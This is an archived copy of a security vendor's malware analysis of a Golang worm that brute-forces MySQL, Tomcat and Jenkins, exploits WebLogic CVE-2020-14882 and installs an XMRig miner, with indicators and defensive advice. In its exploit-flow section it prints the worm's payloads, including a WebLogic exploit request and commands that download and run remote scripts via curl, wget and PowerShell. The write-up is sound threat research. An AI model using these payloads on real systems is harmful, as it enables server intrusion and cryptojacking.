{
    "id": "6846f9ce-bc48-4533-916d-225378dbbd5f",
    "created_at": "2023-01-12T15:02:25.621378Z",
    "updated_at": "2025-03-27T02:06:10.657436Z",
    "deleted_at": null,
    "sha1_hash": "a476e9a653024e5c29be6de50a36f841d95d7274",
    "title": "2020-12-29 - Early Bird Catches the Worm- New Golang Worm Drops XMRig Miner on Servers",
    "authors": "",
    "file_creation_date": "2022-05-28T15:51:40Z",
    "file_modification_date": "2022-05-28T15:51:40Z",
    "file_size": 1537118,
    "plain_text": "# Early Bird Catches the Worm: New Golang Worm Drops XMRig Miner on Servers\n\n**[intezer.com/blog/research/new-golang-worm-drops-xmrig-miner-on-servers/](https://www.intezer.com/blog/research/new-golang-worm-drops-xmrig-miner-on-servers/)**\n\nDecember 29, 2020\n\nWritten by Avigayil Mechtinger - 29 December 2020\n\n### Get Free Account\n\nJoin Now\n\n## Intro\n\nIn early December, we discovered a new, undetected worm written in Golang. This worm continues the popular 2020\ntrend of multi-platform malware developed in Golang.\n\nThe worm attempts to spread across the network in order to run XMRig Miner on a large scale. The malware targets\nboth Windows and Linux servers and can easily maneuver from one platform to the other. It targets public facing\nservices; MySQL, Tomcat admin panel and Jenkins that have weak passwords. In an older version, the worm has\nalso attempted to exploit WebLogic’s latest vulnerability: CVE-2020-14882.\n\nDuring our analysis, the attacker kept updating the worm on the Command and Control (C&C) server, indicating that\nit’s active and might be targeting additional weak configured services in future updates.\n\n## Technical Analysis\n\n\n-----\n\nThe attack uses three files: a dropper script (bash or powershell), a Golang binary worm, and an XMRig Miner all\nof which are hosted on the same C&C.\n\nThe ELF worm binary and the bash dropper script are both fully undetected in VirusTotal at the time of this\npublication. Figure 1 shows the ELF worm binary result in VirusTotal.\n\n_Figure 1: ELF file fully undetected in VirusTotal (ead2cf8ab7aef63706b40eb57d668d0a)_\n\nThe malware behaves similarly on both Linux and Windows operating systems. We will describe the Linux worm flow\nbelow.\n\n## Linux Worm Flow\n\nUpon execution, the worm checks if a process on the infected machine is listening on port 52013. The existence of a\nlistener on this port functions as a mutex for the malware. If a socket for the port is already open, the instance exits,\notherwise it opens a network socket on the port.\n\nIn the older version, the worm will then unpack the XMRig Miner as Network01 to the tmp folder and run it. The\n[miner is embedded within the Golang binary using a Go resource embedding package called](https://go.libhunt.com/categories/538-resource-embedding) [go-bindata. The](https://github.com/go-bindata/go-bindata)\nbindataFile functions are used by the malware to unpack the embedded XMRig Miner binary. Figure 2 shows the\nfunction inside this file.\n\n_Figure 2: xmrig_linux_amd64.go file_\n\n\n-----\n\nThe malware will scan the network using TCP SYN in order to find services it can brute force and spread over the\nnetwork. It will scan for IPs that have open ports related to these services: 8080 for Tomcat and Jenkins, 3306 for\nMySQL and 7001 for WebLogic on older versions of the worm. Each of these exploits has a package under the src\n“exp” (exploit) code.\n\n_Figure 3: “exp” package files and functions_\n\n[The worm uses the gopacket library that provides C bindings for Go to use libpcap to read network packets. By](https://github.com/google/gopacket)\nrunning pcapc, the worm gathers network data which is used to gather ACKS and continue to brute force the\nservices. Figure 4 shows the worm’s output for brute force and exploitation attempts on Tomcat and MySQL\nservices.\n\n\n-----\n\n_Figure 4: Snippet from worm output_\n\nPost exploitation, the malware will deliver a loader script: ld.sh for Linux and ld.ps1 for Windows. The loader is\nresponsible for dropping and running the XMRig Miner and the Golang worm on the exploited service. See loader\nscripts in Figures 5 and 6.\n\n\n-----\n\n_Figure 5: ldr.sh – Dropper bash script for Linux-based services_\n\n_Figure 6: ldr.ps1 script – Dropper powershell script for Windows-based services_\n\n## Exploit Flow\n\nThe following describes the attack flow for each service.\n\n## MySql: Port 3306\n\nThe malware will run a credential spraying brute force attack. The malware uses a hardcoded dictionary of weak\ncredentials such as root:123456 for this attack\n\n\n-----\n\nAfter a successful login, it will run a shellcode to gain a local privilege escalation using mysql UDF. The exploits are\nembedded within the binary as a hex string. The worm has an exploit for each operating system and architecture\n[(UDFLINUX32, UDFLINUX64, UDFLWIN32 and UDFWIN64). Browse here for more information about the exploit.](https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss)\n\nAfter running the exploit, the payload will use the sys_exec command to drop and run the loader script. URLWIN and\nURLLINUX store the dropper script URL. Figures 7 and 8 show the described payload for each operating system.\n\n_Figure 7: MySQL queries – Linux payload_\n\n_Figure 8: MySQL queries – Windows payload_\n\n## Tomcat: Port 8080\n\nThe malware will run credential spraying on the admin panel using basic authentication.\n\n_Figure 9: Example of an authentication request to the Tomcat admin panel_\n\nUpon a successful trial, the malware will attempt to deploy a WAR file (Web Application Resource), which will be\nused to transfer the 1.jsp file containing the malicious payload.\n\nThe malware will send Get requests and will parse the parameters with the jsp file: %s/1.jsp?win=%s&linux=%s.\nThese parameters will contain the dropper script URL. The jsp script will then drop and run the loaders.\n\n\n-----\n\n_Figure 10: 1.jsp file script_\n\n## Jenkins: Port 8080\n\nSimilar to previous exploits, the malware will brute force Jenkins login with password spraying and run the following\npayload:\n\n_cmd@/c@powershell iex(New-Object Net.WebClient).DownloadString(‘%s’)!bash@-c@(curl -fsSL %s || wget -q -O –_\n_%s) | bash_\n\n_println “%s”+”%s”;def s=new String(Base64.getDecoder().decode(“%s”+”%s”.reverse())).split(“!”);def_\n_c=System.getProperty(“os.name”).contains(“indo”)?s[0].split(“@”):s[1].split(“@”);c.execute()_\n\n## WebLogic: Port 7001\n\nIn the older version, the malware uses the latest WebLogic remote code execution exploit CVE-2020-14882. It will\nsend a get request to the WebLogic service, and use the GET request headers as part of the payload.\n\n_GET_\n\n_/console/css/%%25%%32%%65%%25%%32%%65%%25%%32%%66consolejndi.portal?_\n_test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(‘weblogic.work.ExecuteThread_\n\n_%%20currentThread(weblogic.work.ExecuteThread)Thread.currentThread();weblogic.work._\n\n_WorkAdapter%%20adapter=currentThread.getCurrentWork();java.lang.reflect.Field%%20_\n\n_field=adapter.getClass().getDeclaredField(“connectionHandler”);field.setAccessible_\n\n_(true);Object%%20obj=field.get(adapter);weblogic.servlet.internal.ServletRequestI_\n\n_mpl%%20req(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod_\n\n_(“getServletRequest”).invoke(obj);String%%20cmd=req.getHeader(“cmd”);String[]%%_\n\n_20cmds=System.getProperty(“os.name”).toLowerCase().contains(“win”)?new%%20String[]_\n_{“cmd.exe”,”/c”,req.getHeader(“win”)}:new%%20String[]{“/bin/sh”,”c”,req.getHeader_\n\n**_(“linux”)};if(cmd!=null{String%%20result=new%%20java.util.Scanner(new%%20java.lang_**\n\n_.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(“%%5C%%5CA”).next();_\n\n_weblogic.servlet.internal.ServletResponseImpl%%20res(weblogic.servlet.internal._\n\n_ServletResponseImpl)req.getClass().getMethod(“getResponse”).invoke(req);work._\n\n_getServletOutputStream().writeStream(new%%20weblogic.xml.util.StringInputStream_\n\n_(result));work.getServletOutputStream().flush_\n\n_();}currentThread.interrupt();’) HTTP/1.0_\n\n_Host: %s:%d_\n\n\n-----\n\n_User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0_\n_Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8_\n_Connection: close_\n**_cmd: ls_**\n**_linux: ( (curl -fsSL %s || wget -q -O – %s) | bash& )_**\n**_win: start powershell iex(New-Object Net.WebClient).DownloadString(‘%s’)_**\n\n## How Do I Protect Myself?\n\nTake the following precautions in order to avoid brute force attacks and vulnerability exploits:\n\n1. Use complex passwords, limit login attempts and use 2FA (Two-Factor Authentication) if possible.\n2. Minimize your use of publicly facing services.\n3. Keep your software updated with the latest security patches.\n[4. Use a Cloud Workload Protection Platform (CWPP), like Intezer Protect, to gain full runtime visibility over the](https://www.intezer.com/)\n\ncode in your system and get alerted on any malicious or unauthorized code. We have a free community\nedition.\n\n## Summary\n\nIn 2020, we saw a noticeable trend of Golang malware targeting different platforms, including Windows, Linux, Mac\nand Android. We assess with high confidence that this will continue in 2021.\n\nThe fact that the worm’s code is nearly identical for both its PE and ELF malware—and the ELF malware going\nundetected in VirusTotal—demonstrates that Linux threats are still flying under the radar for most security and\ndetection platforms. [Subscribe to our weekly threat feed to receive the latest low-detected Linux threat hashes.](https://www.intezer.com/resource/intezer-request-access-to-our-weekly-low-detected-linux-threat-feed/)\n\nBoth PE and ELF worms are now classified as XMRig Miner Dropper in [Intezer Analyze, which means you can](http://analyze.intezer.com/)\ndetect and classify any variants that are genetically similar.\n\n**Special thanks to Joakim Kennedy for his contribution to this research.**\n\n## IoCs\n\n C&C\n\n185[.]239[.]242[.]71\n\n\n-----\n\n## Files\n\nOperating\nsystem\n\nLinux\nfiles\n\n\nDropper\nscript\n\n\nDescription File\nname\n\n\nFile type MD5\n\n\nldr.sh Bash script 236d7925cfafc1f643babdb8e48966bf\n\n\nWorm [sysrv](https://www.virustotal.com/gui/search/name%253Asysrv) 64bit\nELF\nbinary\n\nMiner xmr32 32bit\nELF\nbinary\n\nMiner xmr64 64bit\nELF\nbinary\n\n\nUPX packed –\nead2cf8ab7aef63706b40eb57d668d0a\nUnpacked –\n750644690e51db9f695b542b463164b9\n\nUPX packed –\nf4c90b41126fc17848bd0d131288bd36\nUnpacked –\n\nD8499b7b2e2aeb76387668306e982673\n\nUPX packed –\n301a0a58dd98ecbbe12c6acbd0c7bbdc\nUnpacked –\nf5859e81ff49dd66e501ec7c0f39c83e\n\n9c2aa65235a939b2811f281a45ecdab0\n\n078b2a96f45b493e82b44f8c5344e7e5\n\n\nWindows\nfiles\n\n\nDropper\nscript\n\n\n[ldr.ps1](https://www.virustotal.com/gui/url/e624ab780b3ee020ca7a98567bfaf533e63be4ae41b8f725a7d78f6899bc29e4) PowerShell script d708a5394e9448ab38201264df423c0a\n\n\nWorm [sysrv.exe](https://www.virustotal.com/gui/search/name%253Asysrv) 32bit\nPE\nbinary\n\nMiner xmr32.exe 32bit\nPE\nbinary\n\nMiner [xmr64.exe](https://www.virustotal.com/gui/url/39c5f4e32bb60d96122cbc306e35ecabc417a175698f951bd59eb44fd3384171) 64bit\nPE\nbinary\n\n\nUPX packed –\n030231d96234f06ae09ca18d621241e5\n\nUnpacked –\n14f57bd246cc1db3131cab421fbc8dac\n\nUPX packed –\n642d73c85e6e79720a5ae7b82fc427c5\nUnpacked –\nb1a4ec25e168156aeee8184b05777b1b\n\n97d89d25e9589f995d374cb7d89b4433\n\n569fcf95f3889cefd87c1b425fa37b03\n\n\n1.jsp Java Server Page 644f20b5a6e03aa054ba62d32f983adc\n\n\n-----\n\n**Avigayil Mechtinger**\nAvigayil is a product manager at Intezer, leading Intezer Analyze product lifecycle. Prior to this role, Avigayil was part\nof Intezer's research team and specialized in malware analysis and threat hunting. During her time at Intezer, she\nhas uncovered and documented different malware targeting both Linux and Windows platforms.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-29 - Early Bird Catches the Worm- New Golang Worm Drops XMRig Miner on Servers.pdf"
    ],
    "report_names": [
        "2020-12-29 - Early Bird Catches the Worm- New Golang Worm Drops XMRig Miner on Servers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535745,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1653753100,
    "ts_modification_date": 1653753100,
    "files": {
        "pdf": "https://archive.orkl.eu/a476e9a653024e5c29be6de50a36f841d95d7274.pdf",
        "text": "https://archive.orkl.eu/a476e9a653024e5c29be6de50a36f841d95d7274.txt",
        "img": "https://archive.orkl.eu/a476e9a653024e5c29be6de50a36f841d95d7274.jpg"
    }
}